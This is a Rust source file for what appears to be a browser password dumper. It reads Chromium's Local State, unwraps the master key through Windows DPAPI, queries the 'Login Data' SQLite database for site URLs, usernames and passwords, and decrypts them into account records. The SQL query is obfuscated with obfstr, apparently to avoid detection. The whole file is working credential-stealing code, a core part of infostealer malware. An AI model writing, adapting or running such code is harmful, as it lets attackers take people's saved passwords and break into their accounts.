use crate::chromium::decryption_core::crypt_unprotect_data;
use crate::chromium::main::DumperResult;
use crate::chromium::models::{ChromeAccount, DecryptedAccount, LocalState};
use app_dirs::{get_app_dir, AppDataType, AppInfo};
use rusqlite::Connection;
use std::fmt::Debug;
use std::fs::File;
use std::io::{BufReader, Read};
use std::path::PathBuf;

impl From<rusqlite::Error> for DumperError {
    fn from(e: rusqlite::Error) -> Self {
        DumperError::SqliteError(e)
    }
}

#[derive(Debug)]
pub enum DumperError {
    SqliteError(rusqlite::Error),
    BrowserNotFound,
    DpapiFailedToDecrypt(u32),
    AesFailedToDecrypt,
    FromUtf8Error,
    IoError,
    JsonError(serde_json::Error),
    Base64Error,
}
use serde::Serialize;

#[derive(Serialize, Clone)]
pub struct Dumper {
    #[serde(skip_serializing)]
    pub app_info: AppInfo,
    local_state_buf: String,
    pub accounts: Vec<DecryptedAccount>,
}


impl Dumper {
    pub fn new(name: &'static str, author: &'static str) -> Self {
        let name = match name {
            "" => "User Data",
            _ => name,
        };

        Dumper {
            app_info: AppInfo { name, author },
            local_state_buf: String::new(),
            accounts: vec![],
        }
    }
}

impl Dumper {

    fn find_browser_local_state(&self) -> DumperResult<PathBuf> {
        let path = match self.app_info.name {
            "User Data" => "/Local State",
            _ => "User Data/Local State",
        };

        get_app_dir(AppDataType::UserCache, &self.app_info, path)
            .map_err(|_| DumperError::BrowserNotFound)
    }


    fn read_local_state(&mut self) -> DumperResult<LocalState> {
        let path = self.find_browser_local_state()?;
        let file = File::open(path)?;
        let mut reader = BufReader::new(file);
        reader.read_to_string(&mut self.local_state_buf)?;

        Ok(serde_json::from_str(self.local_state_buf.as_str())
            .map_err(|e| DumperError::JsonError(e))?)
    }


    fn query_accounts(&self) -> DumperResult<Vec<ChromeAccount>> {
        let path = match self.app_info.name {
            "User Data" => "/Default/Login Data",
            _ => "User Data/Default/Login Data",
        };

        let db_url = get_app_dir(AppDataType::UserCache, &self.app_info, path)
            .map_err(|_| DumperError::BrowserNotFound)?;
        let conn = Connection::open(db_url)?;
        let mut stmt = conn.prepare(obfstr::obfstr!("SELECT origin_url, username_value, password_value FROM logins"))?;

        let chrome_accounts = stmt
            .query_map([], |row| {
                Ok(ChromeAccount::new(row.get(0)?, row.get(1)?, row.get(2)?))
            })?
            .filter_map(|acc| acc.ok())
            .collect();

        Ok(chrome_accounts)
    }


    pub fn dump(&mut self) -> DumperResult<()> {
        let local_state = self.read_local_state().ok();
        if let Some(local_state) = local_state {
            let mut decoded_encryption_key =
                base64::decode(local_state.os_crypt.encrypted_key.to_string())
                    .map_err(|_| DumperError::Base64Error)?;

            let mut master_key = crypt_unprotect_data(&mut decoded_encryption_key[5..])?;

            let mut accounts = self
                .query_accounts()?
                .into_iter()
                .filter(|acc| !acc.encrypted_pwd.is_empty() && !acc.website.is_empty())
                .map(|acc| {
                    let res = DecryptedAccount::from_chrome_acc(acc.clone(), None);
                    if let Err(_) = res {
                        DecryptedAccount::from_chrome_acc(
                            acc.clone(),
                            Some(master_key.as_mut_slice()),
                        )
                    } else {
                        res
                    }
                })
                .filter_map(|v| v.ok())
                .collect::<Vec<_>>();
            self.accounts.append(&mut accounts);
        } else {
            let mut accounts = self
                .query_accounts()?
                .into_iter()
                .filter(|acc| !acc.encrypted_pwd.is_empty() && !acc.website.is_empty())
                .filter_map(|acc| DecryptedAccount::from_chrome_acc(acc.clone(), None).ok())
                .collect::<Vec<_>>();
            self.accounts.append(&mut accounts);
        }

        Ok(())
    }
}
